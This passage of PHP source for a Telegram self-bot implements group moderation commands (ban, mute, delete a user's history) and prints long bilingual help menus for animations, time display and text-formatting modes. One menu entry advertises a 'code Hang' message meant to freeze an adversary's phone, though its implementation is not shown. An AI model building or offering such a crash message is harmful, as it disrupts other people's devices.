                                $unmute = ['_' => 'chatBannedRights', 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 9999];
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unmute,]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝒘𝒂𝒔 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑼𝒏𝒔𝒊𝒍𝒆𝒏𝒕𝒆𝒅!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(ban)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                $ban = ['_' => 'chatBannedRights', 'view_messages' => true, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => true, 'pin_messages' => true, 'until_date' => 99999];
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $ban,]);
                                yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝒘𝒂𝒔 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒃𝒂𝒏𝒏𝒆𝒅!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(delall)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                yield $this->channels->deleteUserHistory(['channel' => $peer, 'user_id' => $messag]);
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**֍ 𝑨𝒍𝒍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑴𝒆𝒔𝒔𝒂𝒈𝒆𝒔 𝑫𝒆𝒍𝒆𝒕𝒆𝒅!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(unban)$/si", $text)) {
                            if ($type3 == 'supergroup' or $type3 == 'chat') {
                                $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                                $mee = yield $this->getFullInfo($messag);
                                $me = $mee['User'];
                                $unban = ['_' => 'chatBannedRights', 'view_messages' => false, 'send_messages' => false, 'send_media' => false, 'send_stickers' => false, 'send_gifs' => false, 'send_games' => false, 'send_inline' => true, 'embed_links' => true, 'send_polls' => true, 'change_info' => true, 'invite_users' => false, 'pin_messages' => true, 'until_date' => 99999];
                                yield $this->channels->editBanned(['channel' => $peer, 'user_id' => $messag, 'banned_rights' => $unban,]);
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝒘𝒂𝒔 𝒔𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝒖𝒏𝒃𝒂𝒏𝒏𝒆𝒅!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(mute)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            if (!in_array($messag, $data['muted'])) {
                                $data['muted'][] = $messag;
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑰𝒔 𝑵𝒐𝒘 𝑴𝒖𝒕𝒆 𝑳𝒊𝒔𝒕!**", 'parse_mode' => 'Markdown']);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑾𝒂𝒔 𝑰𝒏 𝑴𝒖𝒕𝒆𝑳𝒊𝒔𝒕!**", 'parse_mode' => 'Markdown']);
                            }
                        }
                        if (preg_match("/^[\/\#\!]?(unmute)$/si", $text)) {
                            $gmsg = $update['message']['reply_to']['reply_to_msg_id'] ?? 0;
                            if (in_array($type3, ['channel', 'supergroup'])) {
                                $gms = yield $this->channels->getMessages(['channel' => $peer, 'id' => [$gmsg]]);
                                $messag = $gms['messages'][0]['from_id']['user_id'];
                            } else {
                                $gms = yield $this->messages->getMessages(['id' => [$gmsg]]);
                                $m = $gms['messages'][0];
                                $messag = $m['from_id']['user_id'] ?? $m['peer_id']['user_id'];
                            }
                            if (in_array($messag, $data['muted'])) {
                                $k = array_search($messag, $data['muted']);
                                unset($data['muted'][$k]);
                                yield $this->filePutContents("data.json", json_encode($data));
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑫𝒆𝒍𝒆𝒕𝒆𝒅 𝑭𝒓𝒐𝒎 𝑴𝒖𝒕𝒆𝒍𝒊𝒔𝒕!**", 'parse_mode' => 'Markdown']);
                            } else {
                                yield $this->messages->sendMessage(['peer' => $peer, 'message' => "**֍** [𝑼𝒔𝒆𝒓](mention:$messag) **𝑾𝒂𝒔𝒏'𝒕 𝑰𝒏 𝑴𝒖𝒕𝒆𝑳𝒊𝒔𝒕!**", 'parse_mode' => 'Markdown']);
                            }
                        }


                    }

                    if (preg_match("/^[\/\#\!]?(answerlist)$/si", $text)) {
                        if (count($data['answering']) > 0) {
                            $txxxt = "**𝑳𝒊𝒔𝒕 𝑶𝒇 𝑨𝒏𝒔𝒘𝒆𝒓𝒔 :**";
                            $counter = 1;
                            foreach ($data['answering'] as $k => $ans) {
                                $txxxt .= "$counter: $k => $ans \n";
                                $counter++;
                            }
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => $txxxt]);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "**֍ 𝑻𝒉𝒆𝒓𝒆 𝑰𝒔 𝑵𝒐 𝑨𝒏𝒔𝒘𝒆𝒓!**", 'parse_mode' => 'Markdown']);
                        }
                    }

                    if (preg_match("/^[\/\#\!]?(funhelp)$/si", $text)) {
                        yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
╰☆☆ P̶a̶w̶n̶ Self Fun Help ☆☆╮
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>آدم فضایی</code>
آدم فضایی پیدا میکنی👽
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>موشک </code>
به سفینه موشک پرت میکنی🚀
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>پول</code>
پول آتیش میزنه🔥
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>خزوخیل</code>
باکاراش عنت میاد😕
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>روح</code>
روحه میترسونش👻
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>برم خونه</code>
پیچوندن کسی خیلی حرفه ای😁
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>شکست عشقی </code>
عاقبت فرار از خونس😒
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>عقاب </code>
عقابه شکارش میکنه🤗
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>حموم</code>
درحموم باز میکنی🤣
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
️ 🔹️<code>آپدیت</code>
سرور آپدیت میشه😶
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>بکشش</code>
جنایتکار کشته میشه😝
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>خایمال</code>
خایه مالو سگ بگاد😝
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>مسجد </code>
پسره میره مسجد📿
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>کوسه</code>
کوسه بهش حمله میکنه⛑
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>بارون</code>
رعد و برق وبارون🌧
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>شب خوش</code>
میخابی🥱
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>برم بخابم</code>
میره و میخابه😴
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>بادکنک</code>
بت چاقو بادکنک پاره میکنی😆
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>فوتبال</code>
توپو میکنه تو دروازه😅
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>فیشینگ</code>
💰phishing
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>غرقش کن</code>
غرقش میکنه😁
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>فضانورد</code>
من میگم ایران قویه🇮🇷
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>بزن قدش</code>
میزنین قدش🧤
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>عشقمی</code>
یه فیل و یه قلب❤
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>شمارش</code>
شمارشش میزنی💫
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>رقص</code>
رقص مکعب ها 🎗
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>قلب</code>  
رقص قلب ها 💓
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>قلبز</code>  
رقص قلب ها ۲ 💗
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>مکعب</code>  
رقص مکعب ها ۲ 💎
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>مربع</code>  
رقص مربع ها 🃏
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>Corona</code> 
کورونا اومده💊
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>کاکتوس</code> 
کاکتوس و بادبادک 🎈
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>vizviz</code> 
 زنبور و انسان بی نوا 🐝
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️<code>vizviz2</code> 
زنبور و انسان بی نوا 🐝
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>car </code>  
 انفجار ماشین🔥
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>Clock</code>  
 رقص ساعت ⌚️
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>motor</code>  
  موتور و اهنربا  🧲
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>ابر</code> 
 رعد وبرق⚡️
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>بارون</code> 
 بارون میاد🌧
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>عشق</code> 
 نشان دادن عشق💕
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>عشق دو</code> 
 (2) نشان دادن عشق💕
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️  <code>moc</code>   
 مکعب های رنگی ریز🟪
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>مرغ</code> 
  دویدن مرغ 🐔
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>خودم</code> 
نمایی از سیس خودم 😅
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>تانک</code> 
تصویر ۳بعدی تانک ✨
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>هک</code> 
هک کن 🖥
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>love3</code> 
تصویر عشق 💌
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>دایناسور</code> 
تصویر ۳بعدی دایناسور 🦕
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>دهنت سرویس</code> 
دهنت سرویس داداش 🤣
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>هک کردن</code> 
هک کردن بقیه 📟
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>code Hang</code>
برای هنگ کردن گوشی بدخواهتون📱
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>روانی</code>
دیوانه و روانی🤪
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🔹️ <code>کرج</code> 
کرج🤝
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
🎴 ᴘɪɴɢ ᴀɴᴅ ʟᴏᴀᴅ ɢᴜɪᴅᴇ 🎴
 
🔱 ʀᴀᴍ ᴜꜱᴇ : $mem_using ᴍʙ 🔱
🛡 ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ : $load[0] 🛡
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
↤↤↤↤↤↤↤↦↦↦↦↦↦↦
",
                            'parse_mode' => 'Markdown']);
                    }
                    if (preg_match("/^[\/\#\!]?(funhelp2)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
ꜱᴇʟꜰ ʙᴏᴛ ꜰᴜɴ ʜᴇʟᴘ2
•» Applied and entertainment tools «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» wiki (text) «•
•» Search Wikipedia «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /weather City Name «•
•» Get the weather of your favorite city «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /music  [Text] «•
•» Favorite music «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /info  [@username] «•
•» User information with ID «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» gpinfo «•
•» Get group information «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /sessions «•
•» Receive active account sessions «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /save  [Replay] «•
•» Save the text of the file and everything else in the robot (cloud) «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /id  [Replay] «•
•» Receive a person's numeric ID with Replay «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» pic (Text) «•
•» Get text related photos «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» gif (Text) «•
•» Get text related gifs «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /joke «•
•» Random jokes «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» like (Text) «•
•» Create text with the Like button «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» search (Text) «•
•» Search your text and group «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» ساعت «•
•» Receive accurate time up to 60 seconds «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» تاریخ شمسی «•
•» Receiving solar history «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» تاریخ میلادی «•
•» Get the Gregorian date «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
➣ ᴘɪɴɢ ᴀɴᴅ ʟᴏᴀᴅ ɢᴜɪᴅᴇ 
 
ᴀᴍᴏᴜɴᴛ ᴏꜰ ʀᴀᴍ ɪɴ ᴜꜱᴇ : $mem_using ᴍʙ
ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
ꜱᴇʟꜰ ʙᴏᴛ ꜰᴜɴ ʜᴇʟᴘ2
•» ابزار کاربردی و سرگرمی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» wiki (text) «•
•» جستجو در ویکی پدیا «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /weather اسم شهر «•
•» دریافت وضعیت هوای شهر دلخواه «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /music  [متن] «•
•» موسیقی دلخواه «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /info  [@username] «•
•» اطلاعات کاربر با ایدی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» gpinfo «•
•» دریافت اطلاعات گروه «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /sessions «•
•» دریافت نشصت های فعال اکانت «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /save  [ریپلی] «•
•» زخیره کردن متن فایل و هرچیز دیگعی تو پیوی (فضای ابری ) ربات «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /id  [ریپلی] «•
•» دریافت ایدی عددی شخص با ریپلی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» pic (متن) «•
•» دریافت عکس مرتبط با متن «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» gif (متن) «•
•» دریافت گیف مرتبط با متن «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» /joke «•
•» جوک بصورت رندوم «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» like (متن) «•
•» ساخت متن بهمراه دکمه ی لایک «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» search (متن) «•
•» جستجوی متن تو پیوی و گروه «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» ساعت «•
•» دریافت ساعت دقیق تا 60 صانیه بروز میشه «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» تاریخ شمسی «•
•» ریافت تاریخ شمسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» تاریخ میلادی «•
•» دریافت تاریخ میلادی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
➣ ᴘɪɴɢ ᴀɴᴅ ʟᴏᴀᴅ ɢᴜɪᴅᴇ 
 
ᴀᴍᴏᴜɴᴛ ᴏꜰ ʀᴀᴍ ɪɴ ᴜꜱᴇ : $mem_using ᴍʙ
ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(actionshelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
ꜱᴇʟꜰ ʙᴏᴛ ᴀᴄᴛɪᴏɴꜱʜᴇʟᴘ
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>typing on</code> Or <code>typing off</code> «•
•» Turn on (off) mode in the group after each message  «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>videoaction on</code> Or <code>videoaction off</code> «•
•»  Turn off video recording mode 🎞
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>audioaction on</code>  Or <code>audioaction off</code> «•
•» Turn sound recording mode on and off 🎤
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>gameplay on</code> Or <code>gameplay off</code> «•
•» Turn game mode on and off «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>markread</code>  on Or <code>markread off</code> «•
•» Turn automatic mode on and off «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>poker  on</code> Or <code>poker off </code> «•
•» Turn poker mode on and off (wherever you see poker, the iplay method 😐) «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>echo on</code> Or <code>echo off</code> «•
•» Turn echo mode on or off (any message in the chat or in the document prompts immediately)
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>lockpv on</code> Or <code>lockpv off</code> ➖
•» When you turn on this mode, anyone who sends a message will be blocked! «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>autochat on</code> Or <code>autochat off</code> «•
•» Auto Chat mode! «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
➣ ᴘɪɴɢ ᴀɴᴅ ʟᴏᴀᴅ ɢᴜɪᴅᴇ 
 
ᴀᴍᴏᴜɴᴛ ᴏꜰ ʀᴀᴍ ɪɴ ᴜꜱᴇ : $mem_using ᴍʙ
ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
ꜱᴇʟꜰ ʙᴏᴛ ᴀᴄᴛɪᴏɴꜱʜᴇʟᴘ
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>typing on</code> یا <code>typing off</code> «•
•» روشن و خاموش کردن حالت (درحال نوشتن)تو گروه بعد ازهرپیام  «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>videoaction on</code> یا <code>videoaction off</code> «•
•»  روشن خاموش کردن حالت ظبط ویدیو 🎞
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>audioaction on</code>  یا <code>audioaction off</code> «•
•» روشن و خاموش کردن حالت ظبط صدا 🎤
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>gameplay on</code> یا <code>gameplay off</code> «•
•» روشن و خاموش کردن حالت بازی 🎮
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>markread</code>  on یا <code>markread off</code> «•
•» روشن و خاموش کردن حالت سین خودکار «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>poker  on</code> یا <code>poker off </code> «•
•» روشن و خاموش کردن حالت پوکر(هرجا پوکر ببینه روش ریپلی میزنه 😐) «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>echo on</code> یا <code>echo off</code> «•
•» روشن یا خاموش کردن حالت طوطی (هرپیامی در گپ یا پیوی سند بشه همون رو فور میکنه)
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>lockpv on</code> یا <code>lockpv off</code> ➖
•» وقتی این حالت رو روشن کنید هرکسی پیوی پیام بده بلاک میشه! «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>autochat on</code> یا <code>autochat off</code> «•
•» حالت پاسخگویی خودکار! «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
➣ ᴘɪɴɢ ᴀɴᴅ ʟᴏᴀᴅ ɢᴜɪᴅᴇ 
 
ᴀᴍᴏᴜɴᴛ ᴏꜰ ʀᴀᴍ ɪɴ ᴜꜱᴇ : $mem_using ᴍʙ
ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0]
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(timehelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
≪━─━─━─━─━◈━─━─━─━─━≫ 
┇******ꜱᴇʟꜰ ʙᴏᴛ ᴛɪᴍᴇʜᴇʟᴘ******┇
≪━─━─━─━─━◈━─━─━─━─━≫ 
•» <code>timename on</code> «•
•» Turn the clock on in the name «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timename off</code> «•
•» Turn the clock off in the name «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timebio on</code> «•
•» Turn the clock on in the bio «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timebio off</code> «•
•» Turn the clock off in the bio «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timepic on</code> «•
•» Turn the clock on in your profile picture «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timepic off</code> «•
•» Turn the clock off in your profile picture «•
≪━─━─━─━─━◈━─━─━─━─━≫ 
✨ ʀᴀᴍ ᴜꜱᴇ : $mem_using ᴍʙ ✨
✨ ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ : $load[0] ✨
≪━─━─━─━─━◈━─━─━─━─━≫  
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
≪━─━─━─━─━◈━─━─━─━─━≫ 
┇******ꜱᴇʟꜰ ʙᴏᴛ ᴛɪᴍᴇʜᴇʟᴘ******┇
≪━─━─━─━─━◈━─━─━─━─━≫ 
•» <code>timename on</code> «•
•» روشن کردن ساعت در اسم «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timename off</code> «•
•» خاموش کردن ساعت در اسم «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timebio on</code> «•
•» روشن کردن ساعت در بیو «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timebio off</code> «•
•» خاموش کردن ساعت در بیو «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timepic on</code> «•
•» روشن کردن عکس دارای ساعت در پروفایل «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>timepic off</code> «•
•» خاموش کردن عکس دارای ساعت در پروفایل «•
≪━─━─━─━─━◈━─━─━─━─━≫ 
✨ ʀᴀᴍ ᴜꜱᴇ : $mem_using ᴍʙ ✨
✨ ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ : $load[0] ✨
≪━─━─━─━─━◈━─━─━─━─━≫  
",
                                'parse_mode' => 'Markdown']);
                        }
                    }
                    if (preg_match("/^[\/\#\!]?(texthelp)$/si", $text)) {
                        if (file_get_contents('language.txt') == 'en') {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
≪━─━─━─━─━◈━─━─━─━─━≫ 
┇******ꜱᴇʟꜰ ʙᴏᴛ ᴛᴇxᴛʜᴇʟᴘ******┇
≪━─━─━─━─━◈━─━─━─━─━≫ 
╔•» <code>hashtag on</code> «•
╠•» Turn off hashtag mode «•
┇
╠•» <code>hashtag off</code> «•
╠•» Turn on hashtag mode «•
┇
╠•» <code>bold on</code> «•
╠•» Turn on text thickening mode «•
┇
╠•» <code>bold off</code> «•
╠•» Turn off text thickening mode «•
┇
╠•» <code>strikethrough on</code> «•
╠•» Turn on strikethrough mode «•
┇
╠•» <code>strikethrough off</code> «•
╠•» Turn off strikethrough mode «•
┇
╠•» <code>italic on</code> «•
╠•» Turn on italic mode «•
┇
╠•» <code>italic off</code> «•
╠•» Turn off italic mode «•
┇
╠•» <code>underline on</code> «•
╠•» Turn on underline mode «•
┇
╠•» <code>underline off</code> «•
╠•» Turn off underline mode «•
┇
╠•» <code>part on</code> «•
╠•» Turn on message editing mode «•
┇
╠•» <code>part off</code> «•
╠•» Turn off message editing mode «•
┇
╠•» <code>coding on</code> «•
╠•» Turn on code writing mode «•
┇
╠•» <code>coding off</code> «•
╠•» Turn off code writing mode «•
┇
╠•» <code>mention on</code> «•
╠•» Turn on mention mode «•
┇
╠ •» <code>mention off</code> «•
╚•» Turn on mention mode «•
≪━─━─━─━─━◈━─━─━─━─━≫ 
✨ ʀᴀᴍ ᴜꜱᴇ : $mem_using ᴍʙ ✨
✨ ᴘɪɴɢ ʟᴏᴀᴅᴇᴅ ꜱᴇʀᴠᴇʀ : $load[0] ✨
≪━─━─━─━─━◈━─━─━─━─━≫  
",
                                'parse_mode' => 'Markdown']);
                        } else {
                            yield $this->messages->editMessage(['peer' => $peer, 'id' => $msg_id, 'message' => "
≪━─━─━─━─━◈━─━─━─━─━≫ 
┇******ꜱᴇʟꜰ ʙᴏᴛ ᴛᴇxᴛʜᴇʟᴘ******┇
≪━─━─━─━─━◈━─━─━─━─━≫ 
•» <code>hashtag on</code> «•
•» روشن کردن حالت هشتگ نویسی «•
🔥↤↤↤↤↤↤↤↤↦↦↦↦↦🔥
•» <code>hashtag off</code> «•
•» خاموش کردن حالت هشتگ نویسی «•
